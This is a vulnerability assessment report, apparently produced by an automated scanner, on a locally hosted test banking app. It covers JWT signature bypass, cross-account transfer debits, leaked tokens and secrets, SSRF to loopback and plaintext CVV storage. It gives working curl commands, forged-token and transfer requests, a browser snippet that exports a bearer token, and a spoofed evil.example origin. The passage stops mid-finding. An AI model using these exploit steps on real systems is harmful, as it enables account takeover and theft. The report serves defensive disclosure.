20%20%20%3C!--%20White-Label%20Partner%20Settings%20Card%20--%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22bg-white%20rounded-2xl%20shadow-sm%20border%20border-dark-100%20p-6%20sm%3Ap-8%20max-w-xl%20mb-6%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22flex%20items-center%20gap-3%20mb-4%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22w-12%20h-12%20bg-amber-100%20rounded-full%20flex%20items-center%20justify-center%20flex-shrink-0%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-6%20h-6%20text-amber-600%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M13.828%2010.172a4%204%200%2000-5.656%200l-4%204a4%204%200%20105.656%205.656l1.102-1.101m-.758-4.899a4%204%200%20005.656%200l4-4a4%204%200%2000-5.656-5.656l-1.1%201.1%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch2%20class%3D%5C%22text-xl%20font-bold%20text-dark-900%5C%22%3EFACE%20Insurance%20Integration%3C%2Fh2%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-sm%20text-dark-500%5C%22%3EConfigure%20target%20URL%20for%20White-Label%20Insurance%20SSO%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cform%20id%3D%5C%22insurance-settings-form%5C%22%20onsubmit%3D%5C%22BankOfEdAdmin.SystemPage.saveSettings(event)%5C%22%20class%3D%5C%22space-y-4%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Clabel%20class%3D%5C%22block%20text-sm%20font-medium%20text-dark-700%20mb-1.5%5C%22%3EFACE%20Insurance%20Base%20URL%3C%2Flabel%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%5C%22url%5C%22%20id%3D%5C%22setting-insurance-url%5C%22%20required%20class%3D%5C%22w-full%20px-4%20py-3%20rounded-xl%20border%20border-dark-200%20focus%3Aring-2%20focus%3Aring-red-500%20focus%3Aborder-red-500%20outline-none%20transition%20text-sm%5C%22%20placeholder%3D%5C%22http%3A%2F%2Flocalhost%3A8001%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-xs%20text-dark-400%20mt-1.5%5C%22%3EWhen%20customers%20click%20Insurance%2C%20they%20will%20be%20redirected%20to%20this%20URL%20with%20an%20SSO%20assertion%20token.%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22p-3.5%20bg-dark-50%20rounded-xl%20text-xs%20text-dark-600%20space-y-1%20font-mono%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%3Cspan%20class%3D%5C%22font-semibold%20text-dark-800%5C%22%3EMerchant%20ID%3A%3C%2Fspan%3E%20%3Cspan%20id%3D%5C%22setting-merchant-id%5C%22%3Efaceinsurance%3C%2Fspan%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%3Cspan%20class%3D%5C%22font-semibold%20text-dark-800%5C%22%3ESettlement%20Account%3A%3C%2Fspan%3E%20%3Cspan%20id%3D%5C%22setting-merchant-account%5C%22%3E062-001%2088880001%20(face%40example.com)%3C%2Fspan%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%3Cspan%20class%3D%5C%22font-semibold%20text-dark-800%5C%22%3EMachine%20Auth%20Token%3A%3C%2Fspan%3E%20%3Cspan%20id%3D%5C%22setting-machine-token%5C%22%20class%3D%5C%22text-dark-500%5C%22%3Emch_face_insurance_secret_key_2026%3C%2Fspan%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20type%3D%5C%22submit%5C%22%20id%3D%5C%22save-settings-btn%5C%22%20class%3D%5C%22bg-dark-900%20hover%3Abg-dark-800%20text-white%20font-semibold%20px-6%20py-2.5%20rounded-xl%20transition-colors%20text-sm%20flex%20items-center%20justify-center%20gap-2%20disabled%3Aopacity-50%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%3ESave%20Settings%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-4%20h-4%20animate-spin%20hidden%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Ccircle%20class%3D%5C%22opacity-25%5C%22%20cx%3D%5C%2212%5C%22%20cy%3D%5C%2212%5C%22%20r%3D%5C%2210%5C%22%20stroke%3D%5C%22currentColor%5C%22%20stroke-width%3D%5C%224%5C%22%20fill%3D%5C%22none%5C%22%3E%3C%2Fcircle%3E%3Cpath%20class%3D%5C%22opacity-75%5C%22%20fill%3D%5C%22currentColor%5C%22%20d%3D%5C%22M4%2012a8%208%200%20018-8V0C5.373%200%200%205.373%200%2012h4z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fbutton%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fform%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%20%20%20%20%20%20%20%20%3C!--%20Reset%20Database%20Card%20--%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22bg-white%20rounded-2xl%20shadow-sm%20border%20border-red-200%20p-6%20sm%3Ap-8%20max-w-xl%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22flex%20items-center%20gap-3%20mb-4%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22w-12%20h-12%20bg-red-100%20rounded-full%20flex%20items-center%20justify-center%20flex-shrink-0%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-6%20h-6%20text-red-600%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M12%209v2m0%204h.01m-6.938%204h13.856c1.54%200%202.502-1.667%201.732-3L13.732%204c-.77-1.333-2.694-1.333-3.464%200L3.34%2016c-.77%201.333.192%203%201.732%203z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch2%20class%3D%5C%22text-xl%20font-bold%20text-dark-900%5C%22%3EReset%20Database%3C%2Fh2%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-sm%20text-dark-500%5C%22%3EDrop%20and%20recreate%20the%20entire%20database%20with%20seed%20data%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22bg-red-50%20border%20border-red-200%20rounded-xl%20p-4%20mb-6%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-red-800%20text-sm%20font-medium%5C%22%3EWarning%3A%20This%20action%20is%20irreversible%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-red-600%20text-xs%20mt-1%5C%22%3EAll%20customer%20data%2C%20accounts%2C%20and%20transactions%20will%20be%20permanently%20deleted%20and%20replaced%20with%20default%20seed%20data.%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-sm%20text-dark-600%20mb-3%5C%22%3EType%20%3Cstrong%3ERESET%3C%2Fstrong%3E%20below%20to%20confirm%3A%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%5C%22text%5C%22%20id%3D%5C%22reset-confirm-input%5C%22%20class%3D%5C%22w-full%20px-4%20py-3%20rounded-xl%20border%20border-dark-200%20focus%3Aring-2%20focus%3Aring-red-500%20focus%3Aborder-red-500%20outline-none%20transition%20font-mono%20tracking-widest%20text-center%20text-lg%20mb-4%5C%22%20placeholder%3D%5C%22Type%20RESET%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20id%3D%5C%22reset-btn%5C%22%20onclick%3D%5C%22BankOfEdAdmin.SystemPage.handleReset()%5C%22%20class%3D%5C%22w-full%20bg-red-600%20hover%3Abg-red-700%20text-white%20font-semibold%20py-3%20rounded-xl%20transition-colors%20flex%20items-center%20justify-center%20gap-2%20disabled%3Aopacity-50%20disabled%3Acursor-not-allowed%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%3EReset%20Database%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-4%20h-4%20animate-spin%20hidden%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Ccircle%20class%3D%5C%22opacity-25%5C%22%20cx%3D%5C%2212%5C%22%20cy%3D%5C%2212%5C%22%20r%3D%5C%2210%5C%22%20stroke%3D%5C%22currentColor%5C%22%20stroke-width%3D%5C%224%5C%22%20fill%3D%5C%22none%5C%22%3E%3C%2Fcircle%3E%3Cpath%20class%3D%5C%22opacity-75%5C%22%20fill%3D%5C%22currentColor%5C%22%20d%3D%5C%22M4%2012a8%208%200%20018-8V0C5.373%200%200%205.373%200%2012h4z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fbutton%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fsection%3E%5Cn%5Cn%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%3C%2Fmain%3E%5Cn%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%3C!--%20Scripts%20--%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Futils.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Fapi.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Frouter.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Fpages%2Fauth.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Fpages%2Fcustomers.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Fpages%2Faccounts.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Fpages%2Fsystem.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Fpages%2Ffx-rates.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Fapp.js%5C%22%3E%3C%2Fscript%3E%5Cn%3C%2Fbody%3E%5Cn%3C%2Fhtml%3E%5Cn%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22skipped%22%2C%22validation_note%22%3A%22Not%20validated%3A%20severity%20'info'%20is%20below%20the%20configured%20threshold%20'low'.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%5D
-->

## 1. Customer authentication accepts JWTs with invalid signatures

- Finding reference: URBN-002
- Severity: critical
- OWASP: A07
- Source: SAST
- Validation: confirmed
- Affected URL: http://localhost:8081/api/profile
- CVSS: 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

### Description
The authentication middleware accepts attacker-controlled JWT claims without verifying the token signature. A JWT signed with an incorrect secret was accepted by the protected customer profile endpoint as belonging to customer ID 2.

### Impact
An unauthenticated attacker could impersonate customers whose numeric IDs are known or guessed, exposing protected banking data and allowing access to operations available to those customers.

### Likelihood
Exploitation requires only a crafted three-part JWT containing a chosen customer ID in the sub claim, a future expiration time, and an unused token identifier. The observed endpoint accepted such a token despite its invalid signature.

### Recommendation
Use a maintained JWT library to verify every token's signature and restrict accepted algorithms before reading or trusting claims. Validate the issuer, audience, expiration, and token identifier as applicable. Rotate the signing keys and invalidate existing tokens after deploying the fix.

### Evidence
```
A JWT containing {"sub":2,"jti":"aespa-invalidsig-20260908","exp":9999999999} was signed with the deliberately incorrect secret "aespa-deliberately-wrong-secret". GET /api/profile accepted the token and returned HTTP 200 with the profile for customer ID 2, including wei.zhang@example.com.
```

### Request Evidence
```
GET /api/profile using session invalid_sig_user2, which contains an HS256 token signed with a deliberately incorrect secret.
```

### Response Evidence
```
HTTP 200: {"success":true,"data":{"id":2,"email":"wei.zhang@example.com","first_name":"Wei","last_name":"Zhang",...},"message":"OK"}
```

### Validation Note
A cookie-free anonymous request returned 401, so the profile endpoint is protected rather than intentionally public. The supplied invalid-signature session returned customer 2's profile, and an independent unsigned alg=none JWT with attacker-controlled sub=2 also returned the same sensitive profile with no cookies. These controls rule out ambient authentication and show that the middleware trusts JWT claims without enforcing a valid signature.

## 2. External transfer endpoint allows unauthorized debits from other customers' accounts

- Finding reference: URBN-021
- Severity: critical
- OWASP: A01
- Source: SAST
- Validation: confirmed
- Affected URL: http://localhost:8081/api/transfers/external
- CVSS: 9.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

### Description
The external transfer endpoint accepts a user-controlled from_account_id without verifying that the account belongs to the authenticated customer. This allows a customer to initiate transfers from another customer's account.

### Impact
Any authenticated customer could transfer funds from other customers' accounts to an account they control, resulting in unauthorized transactions and financial loss.

### Likelihood
Exploitation requires one authenticated request. Account IDs are sequential and exposed elsewhere in the application, making valid source accounts easy to identify.

### Recommendation
Query the source account using both its ID and the authenticated user's ID, and reject the request if no owned account is found. Repeat the ownership check inside the atomic transfer service before changing balances. Add authorization tests covering attempts to transfer from accounts owned by other users.

### Evidence
```
While authenticated as Amelia, a request used Zoe's account ID 6 as from_account_id and Amelia's account number as the destination. The endpoint returned HTTP 201 with transaction ID 39 and status completed. The response reported a new source balance of 1875.20, compared with Zoe's authorized baseline balance of 1875.21, confirming that Amelia's session debited Zoe's account by 0.01.
```

### Request Evidence
```
Authenticated as amelia.chen@example.com: POST /api/transfers/external body {"from_account_id":6,"to_bsb":"062-001","to_account_number":"10000001","amount":"0.01","description":"AESPA ownership test"}.
```

### Response Evidence
```
HTTP 201: {"transaction_id":39,"from_account_id":6,"to_account_number":"10000001","amount":"0.01","new_from_balance":"1875.20","status":"completed"}. Zoe's authorized baseline GET /api/accounts/6 showed balance 1875.21.
```

### Validation Note
I tested the session-confusion and legitimate-ownership explanations with a separate authenticated customer. The weak_test session resolves to user ID 17 and its authenticated account list is empty, while Zoe's session shows that account 6 belongs to Zoe. Despite that, weak_test successfully POSTed a one-cent transfer from account 6, received HTTP 201 with status completed, and reduced the reported source balance from 1875.20 to 1875.19. This independently reproduces the missing ownership check with a clearly different non-admin customer session.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 -X POST -H 'Content-Type: application/json' -H 'Content-Type: application/json' --data-raw '{"from_account_id":6,"to_bsb":"062-001","to_account_number":"30000002","account_name":"Zoe Williams","amount":"0.01","description":"authorization validation"}' http://localhost:8081/api/transfers/external -H "Authorization: Bearer $(cat aespa-poc-auth.txt)"
```

### Validation Setup
This finding requires an authenticated session (log in as **weak_test** or an equivalent user).

Log in as the weak_test customer and copy its bearer token from the Authorization request header. This customer should have no accounts.

Capture the credential into a file named `aespa-poc-auth.txt` in the directory you run the command from:

In the browser DevTools Console (adjust the storage key for the app):
```js
const token = localStorage.getItem('token'); // or sessionStorage
const a = document.createElement('a');
a.href = URL.createObjectURL(new Blob([token], {type:'text/plain'}));
a.download = 'aespa-poc-auth.txt'; a.click();
```

Then move `aespa-poc-auth.txt` next to where you run the command below.

## 3. Published fallback token authorizes payment transfers

- Finding reference: URBN-004
- Severity: critical
- OWASP: A07
- Source: SAST
- Validation: confirmed
- Affected URL: http://localhost:8081/api/payments/transfer
- CVSS: 9.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H)

### Description
The payment transfer endpoint accepts a publicly available fallback machine token as authorization to transfer funds from the seeded FACE Insurance settlement account.

### Impact
An unauthenticated attacker with the published token can transfer funds from the merchant settlement account to arbitrary internal or external accounts.

### Likelihood
Exploitation requires only a network request using the published static token. The deployed endpoint accepted the token and completed a transfer without separate user authentication or approval.

### Recommendation
Immediately revoke and rotate the exposed token. Remove fallback credentials from published content and deployed code, and fail closed when required deployment secrets are missing. Issue narrowly scoped machine credentials that restrict permitted requests, source accounts, destinations, and transaction limits. Review transfer logs for unauthorized activity associated with this token.

### Evidence
```
An anonymous request used Bearer mch_face_insurance_secret_key_2026 to transfer AUD 0.01 from seeded account 062-001/88880001 to controlled account 062-001/10000001. The endpoint returned HTTP 200 with status "success", receipt REC-BOE-20260908-825C78E6, and transaction_id 42.
```

### Request Evidence
```
POST /api/payments/transfer with the published bearer token and body selecting the seeded FACE Insurance account, controlled destination, and amount 0.01.
```

### Response Evidence
```
HTTP 200: {"status":"success","receipt_number":"REC-BOE-20260908-825C78E6","amount":"0.01","from_account_number":"88880001","to_account_number":"10000001","transaction_id":42}.
```

### Validation Note
A cookie-free request with no token returned 401, and a random bearer token also returned 401, so the endpoint is not intentionally public. The reported fallback token was accepted in the same anonymous context, advanced an empty request to field validation, and then completed a real AUD 0.01 transfer from 062-001/88880001 to 062-001/10000001 with receipt REC-BOE-20260908-DC15DD18 and transaction ID 43. This rules out carried session state, a generic 200 response, and acceptance of arbitrary bearer values.

## 4. Unauthenticated health endpoint exposes JWT signing secret

- Finding reference: URBN-001
- Severity: critical
- OWASP: A02
- Source: SAST
- Validation: confirmed
- Affected URL: http://localhost:8081/api/health
- CVSS: 9.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

### Description
The unauthenticated health endpoint at /api/health discloses the application's JWT signing secret, database connection details, runtime versions, and production environment name.

### Impact
An attacker could use the exposed signing secret to forge customer JWTs where that secret is used for signature verification, potentially enabling customer impersonation. The database and server details also provide information that could assist further attacks.

### Likelihood
The information is exposed through a single unauthenticated GET request. No user interaction or prior access is required.

### Recommendation
Return only a minimal health status from the public endpoint. Move detailed diagnostics behind operator authentication or network access controls. Rotate the exposed JWT signing secret immediately, invalidate tokens signed with the old secret where possible, and remove the development fallback secret from production configuration.

### Evidence
```
An anonymous GET request received HTTP 200 with JSON containing the JWT secret "bankofed-dev-secret-change-in-production", database host "127.0.0.1", database name "bankofed", database user "root", PHP version 8.4.25, Apache version 2.4.68, and environment "production".
```

### Request Evidence
```
GET /api/health with use_session=anonymous and no authentication.
```

### Response Evidence
```
HTTP 200: {"success":true,"data":{"status":"ok","php_version":"8.4.25","server":"Apache/2.4.68 (Unix)","db_host":"127.0.0.1","db_name":"bankofed","db_user":"root","jwt_secret":"bankofed-dev-secret-change-in-production","environment":"production"},"message":"OK"}
```

### Validation Note
A direct anonymous GET returned HTTP 200 and exposed the exact jwt_secret value plus db_host, db_name, and db_user in live JSON. This rules out the main benign explanations that the evidence came only from SAST, a protected debug page, or a generic health response. I also tried to locate a protected customer route for a forged-token disproof, but the supplied customer session was not injected and the guessed profile route did not exist; that does not change the independently confirmed unauthenticated secret disclosure.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 http://localhost:8081/api/health
```

## 5. Default administrator credentials

- Finding reference: URBN-054
- Severity: critical
- OWASP: A07
- Source: Dynamic
- Validation: unconfirmed
- Affected URL: http://localhost:8081/api/admin/auth/login
- CVSS: 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

### Description
The administrator login accepted a predictable default username and password.

### Impact
An attacker can obtain administrator access to customer records and administrative functions.

### Likelihood
Directly exploitable using common default credentials, as confirmed by the successful login and subsequent authorized admin request.

### Recommendation
Remove default credentials, require a unique administrator password during setup, reset the exposed account, and add MFA and login rate limiting.

### Evidence
```
POST /api/admin/auth/login with the default administrator credentials returned HTTP 200 and an administrator bearer token.

REQUEST:
GET http://localhost:8081/api/admin/auth/login
use_session: anonymous  Authorization: present
Cookies: none
{}

RESPONSE:
Status: 405
date: Tue, 08 Sep 2026 13:13:06 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 87
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":false,"error":{"code":"METHOD_NOT_ALLOWED","message":"Method not allowed."}}
```

### Request Evidence
```
GET http://localhost:8081/api/admin/auth/login
use_session: anonymous  Authorization: present
Cookies: none
{}
```

### Response Evidence
```
Status: 405
date: Tue, 08 Sep 2026 13:13:06 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 87
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":false,"error":{"code":"METHOD_NOT_ALLOWED","message":"Method not allowed."}}
```

### Validation Note
The supplied evidence does not contain the claimed successful POST: it shows a GET that receives 405, while the live POST requires username and password and rejects a deliberately invalid control with 401. Repeating the empty POST with the listed admin session produces the same 422 as anonymous, so the stray Authorization header does not explain a login success. The exact default username/password and the response from the claimed 200 POST are missing, so the finding cannot be confirmed or given a concrete benign explanation.

## 6. Shared default password across customer accounts

- Finding reference: URBN-053
- Severity: critical
- OWASP: A07
- Source: Dynamic
- Validation: unconfirmed
- Affected URL: http://localhost:8081/api/auth/login
- CVSS: 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

### Description
A customer account accepted the known default password, while the unauthenticated user export showed the same password hash for multiple customer accounts.

### Impact
An attacker can take over customer accounts and access or modify banking data.

### Likelihood
Highly likely because the default password successfully authenticated and the identical exported hashes indicate that it is shared across accounts.

### Recommendation
Assign unique random initial credentials, force password changes, block known default passwords, and reset all affected customer passwords.

### Evidence
```
Logging in as Zoe with the default password returned HTTP 200. The user export showed the same password hash on several customer records.

REQUEST:
GET http://localhost:8081/api/auth/login
use_session: anonymous  Authorization: present
Cookies: none
{"Origin": "https://evil.example"}

RESPONSE:
Status: 405
date: Tue, 08 Sep 2026 13:13:54 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: https://evil.example
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 87
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":false,"error":{"code":"METHOD_NOT_ALLOWED","message":"Method not allowed."}}
```

### Request Evidence
```
GET http://localhost:8081/api/auth/login
use_session: anonymous  Authorization: present
Cookies: none
{"Origin": "https://evil.example"}
```

### Response Evidence
```
Status: 405
date: Tue, 08 Sep 2026 13:13:54 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: https://evil.example
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 87
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":false,"error":{"code":"METHOD_NOT_ALLOWED","message":"Method not allowed."}}
```

### Validation Note
The evidence does not establish the finding. It contains no POST request or response showing that Zoe's credentials were accepted, and none of the supplied responses contains a user export or password hashes. The only authentication-related check shown for Zoe is a GET to /api/auth/me that returned a route-level 404, while the login endpoint was tested with GET and correctly returned 405; those requests do not prove or disprove password reuse. The admin customer responses also omit password fields, so the claimed shared hash cannot be verified from the available evidence.

## 7. Authenticated SSRF through profile avatar URL import

- Finding reference: URBN-018
- Severity: high
- OWASP: A10
- Source: SAST
- Validation: confirmed
- Affected URL: http://localhost:8081/api/profile/avatar
- CVSS: 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

### Description
The profile avatar endpoint accepts an attacker-controlled URL in the JSON `url` field, fetches the resource from the application server, and returns its contents as a base64 data URL. An authenticated request using `https://example.com` returned the Example Domain HTML in `avatar_data`, confirming server-side request forgery with response disclosure.

### Impact
An authenticated attacker can make the application server request attacker-chosen URLs and read the returned content. If reachable from the server, this could expose internal HTTP services, loopback-only endpoints, or cloud metadata services.

### Likelihood
High. Any authenticated user with access to the endpoint can supply a URL through the documented JSON field. The captured request confirmed that the server fetched and returned content from an external URL.

### Recommendation
Prefer direct file uploads for profile avatars. If URL imports are required, allow only approved HTTPS origins. Resolve hostnames and reject loopback, private, link-local, multicast, and reserved IPv4 and IPv6 addresses. Repeat these checks after every redirect, limit redirects, response sizes, and timeouts, and route requests through an isolated outbound proxy.

### Evidence
```
A POST request containing `{"url":"https://example.com"}` returned HTTP 200. The response reported `source_url` as `https://example.com`, a size of 559 bytes, and an `avatar_data` value containing base64-encoded HTML that begins with the Example Domain page and includes `<title>Example Domain</title>`.
```

### Request Evidence
```
POST /api/profile/avatar HTTP/1.1
Content-Type: application/json
Authorization: Bearer [REDACTED_BEARER] session]

{"url":"https://example.com"}
```

### Response Evidence
```
HTTP/1.1 200

{"success":true,"data":{"avatar_data":"data:text\/html;base64,PCFkb2N0eXBlIGh0bWw+PGh0bWwgbGFuZz0iZW4iPjxoZWFkPjx0aXRsZT5FeGFtcGxlIERvbWFpbjwvdGl0bGU+...","size":559,"source_url":"https:\/\/example.com"},"message":"OK"}
```

### Validation Note
Using the supplied admin session, I compared an ordinary external URL with a loopback URL. POSTing http://127.0.0.1:8081/ returned HTTP 200 and disclosed the local application's HTML as a base64 data URL, including the distinctive local page title, so the endpoint neither blocks loopback destinations nor enforces an image response type. This directly disproves the plausible innocent explanations of URL echoing, external-only fetching, or safe avatar-only validation.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 -X POST -H 'Content-Type: application/json' -H 'Content-Type: application/json' --data-raw '{"url":"http://127.0.0.1:8081/"}' http://localhost:8081/api/profile/avatar -H "Authorization: Bearer $(cat aespa-poc-auth.txt)"
```

### Validation Setup
This finding requires an authenticated session (log in as **admin** or an equivalent user).

Log in as the admin user and copy the bearer token from the Authorization request header or browser storage.

Capture the credential into a file named `aespa-poc-auth.txt` in the directory you run the command from:

In the browser DevTools Console (adjust the storage key for the app):
```js
const token = localStorage.getItem('token'); // or sessionStorage
const a = document.createElement('a');
a.href = URL.createObjectURL(new Blob([token], {type:'text/plain'}));
a.download = 'aespa-poc-auth.txt'; a.click();
```

Then move `aespa-poc-auth.txt` next to where you run the command below.

## 8. Credit-card CVV stored and returned in plaintext

- Finding reference: URBN-015
- Severity: high
- OWASP: A02
- Source: SAST
- Validation: confirmed
- Affected URL: http://localhost:8081/api/accounts
- CVSS: 7.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

### Description
The credit-card account creation endpoint stores the card CVV and returns it in plaintext together with the full card number and expiry date.

### Impact
Access to account responses or stored card records could expose complete payment-card verification data and increase the risk of card fraud.

### Likelihood
